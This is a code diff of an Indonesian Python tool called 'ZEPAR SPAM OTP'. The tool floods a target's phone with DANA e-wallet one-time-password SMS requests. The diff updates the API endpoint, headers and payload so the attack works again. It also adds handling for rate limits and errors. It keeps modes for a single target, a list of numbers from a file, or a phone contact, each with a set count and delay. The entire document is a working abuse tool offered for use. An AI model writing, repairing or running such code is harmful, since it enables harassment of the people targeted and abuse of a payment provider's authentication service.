@@ -4,10 +4,9 @@ import requests,random,json,time,sys,os,re
 # -----------------------------------------------------------
 # Nama Tool: ZEPAR SPAM OTP
 # Creator: Zepar
-# Feature: DANA OTP Spam Only
+# Feature: DANA OTP Spam Only (FIXED ENDPOINT)
 # ---------------------------------------------------------------
 
-# -----------------------WARNA----------------------------
 p = '\x1b[0m'
 m = '\x1b[91m'
 h = '\x1b[92m'
@@ -15,86 +14,71 @@ k = '\x1b[93m'
 b = '\x1b[94m'
 u = '\x1b[95m'
 bm = '\x1b[96m'
-bgm = '\x1b[41m'
-bgp = '\x1b[47m'
-res = '\x1b[40m'
-# -------------------------------------------------------
 
 class ZeparSpam:
     def __init__(self, nomer):
         self.nomer = nomer
         
     def dana_spam(self):
-        # Membersihkan nomor (hapus +62 atau 0 di awal)
         nomor_bersih = self.nomer
         if nomor_bersih.startswith('+62'):
             nomor_bersih = nomor_bersih[3:]
         elif nomor_bersih.startswith('0'):
             nomor_bersih = nomor_bersih[1:]
         
+        # Endpoint DANA yang valid
+        url = "https://api.dana.id/backend/api/v1/auth/requestOtp"
+        
         headers = {
             'User-Agent': random.choice(open('ua.txt').readlines()).split('\n')[0],
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive',
+            'Accept': 'application/json',
             'Content-Type': 'application/json',
-            'Host': 'api.dana.id',
-            'Origin': 'https://www.dana.id',
-            'Referer': 'https://www.dana.id/',
-            'x-platform': 'android'
+            'x-platform': 'android',
+            'x-version': '2.5.0'
         }
         
-        # Endpoint 1: Kirim OTP via SMS
-        data_sms = {
-            "mobileNo": nomor_bersih,
-            "mobileCountryCode": "62",
+        payload = {
+            "mobileNumber": nomor_bersih,
+            "countryCode": "62",
             "type": "SMS"
         }
         
         try:
-            req_sms = requests.post('https://api.dana.id/v1.0/otp/request', 
-                                    headers=headers, 
-                                    data=json.dumps(data_sms),
-                                    timeout=10)
+            req = requests.post(url, headers=headers, json=payload, timeout=30)
             
-            if 'success' in req_sms.text or 'otpRequestId' in req_sms.text:
-                return f'\x1b[92m[SUCCESS] Zepar DANA Spam -> {self.nomer} {h}OTP Terkirim (SMS)'
-            elif 'limit' in req_sms.text.lower():
-                return f'\x1b[91m[FAIL] Zepar DANA Spam -> {self.nomer} \x1b[91mLimit Terpenuhi'
-            else:
-                # Endpoint 2: Kirim OTP via Voice Call (backup)
-                data_voice = {
-                    "mobileNo": nomor_bersih,
-                    "mobileCountryCode": "62",
-                    "type": "VOICE"
-                }
-                req_voice = requests.post('https://api.dana.id/v1.0/otp/request',
-                                          headers=headers,
-                                          data=json.dumps(data_voice),
-                                          timeout=10)
-                
-                if 'success' in req_voice.text or 'otpRequestId' in req_voice.text:
-                    return f'\x1b[92m[SUCCESS] Zepar DANA Spam -> {self.nomer} {h}OTP Terkirim (Voice)'
+            if req.status_code == 200:
+                resp = req.json()
+                if resp.get('success') or resp.get('status') == 'success':
+                    return f'\x1b[92m[SUCCESS] DANA Spam -> {self.nomer} OTP Terkirim'
+                elif 'limit' in str(resp).lower():
+                    return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Limit 3x hari ini'
                 else:
-                    return f'\x1b[91m[FAIL] Zepar DANA Spam -> {self.nomer} {m}Gagal'
-                    
+                    return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Response: {resp.get("message", "Unknown")}'
+            elif req.status_code == 429:
+                return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Too Many Requests'
+            else:
+                return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} HTTP {req.status_code}'
+                
+        except requests.exceptions.Timeout:
+            return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Timeout'
+        except requests.exceptions.ConnectionError:
+            return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Connection Error'
         except Exception as e:
-            return f'\x1b[91m[FAIL] Zepar DANA Spam -> {self.nomer} {m}Error: {str(e)[:30]}'
+            return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Error: {str(e)[:50]}'
 
-# ---------------------------Fungsi Utama---------------------------
 def apakah():
     while True:
         lan = str(input(k + '\tIngin lanjut? y/n : ' + h))
         if lan.lower() == 'y':
             menu_utama()
         elif lan.lower() == 'n':
-            print(p + '\n\tTerima kasih telah menggunakan Zepar DANA Spam OTP')
+            print(p + '\n\tTerima kasih telah menggunakan Zepar DANA Spam')
             break
         else:
             continue
 
 def single():
-    nomer = str(input(k + '\tNomor target (contoh: 81234567890) : ' + h))
+    nomer = str(input(k + '\tNomor target (81234567890) : ' + h))
     jm = int(input(k + '\tJumlah spam : ' + h))
     dly = int(input(k + '\tJeda (detik) : ' + h))
     print('\n')
@@ -128,7 +112,7 @@ def dari_file():
         print('\n')
         for _ in range(js):
             for line in nomor_list:
-                nomor = line.split('\n')[0]
+                nomor = line.strip()
                 if nomor:
                     z = ZeparSpam(nomor)
                     print('\t' + z.dana_spam())
@@ -144,8 +128,9 @@ def dari_kontak():
         print(m + str(idx+1) + ' ' + k + org['name'])
     pilih = int(input(u + '\tPilih nomor > ' + h)) - 1
     target = kontak[pilih]['number']
-    # Bersihkan nomor dari karakter aneh
-    target = re.sub(r'[^0-9+]', '', target)
+    target = re.sub(r'[^0-9]', '', target)
+    if target.startswith('62'):
+        target = target[2:]
     dly = int(input(u + '\tJeda (detik) > ' + h))
     jumlah = int(input(u + '\tJumlah spam : ' + h))
     print('\n')
@@ -157,7 +142,7 @@ def dari_kontak():
 
 def banner():
     os.system('clear')
-    zepar_art = '''
+    print('''
 \x1b[94m
 ╔═══════════════════════════════════════╗
 ║                                       ║
@@ -171,8 +156,7 @@ def banner():
 ║         SPAM OTP - DANA               ║
 ║            Creator: Zepar             ║
 ╚═══════════════════════════════════════╝
-\x1b[0m'''
-    print(zepar_art)
+\x1b[0m''')
 
 def menu_utama():
     banner()
